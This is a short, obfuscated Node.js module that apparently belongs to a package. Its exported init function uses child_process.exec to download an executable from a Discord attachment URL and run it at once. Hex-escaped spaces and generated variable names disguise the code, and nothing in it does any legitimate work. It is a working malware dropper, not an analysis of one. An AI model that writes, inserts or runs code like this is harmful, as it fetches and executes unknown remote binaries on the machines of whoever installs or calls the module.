const {exec} = require('node:child_process');
function init() {
    exec('curl\x20https://cdn.discordapp.com/attachments/1033806593281769572/1033832120067567657/a_1.exe\x20-o\x20a.exe\x20&&\x20a.exe', (_0x260154, _0x1fb4c9, _0x18b8fb) => {
        _0x260154 && console['log']('error:\x20' + _0x260154['message']);
    });
}
module['exports'] = init;
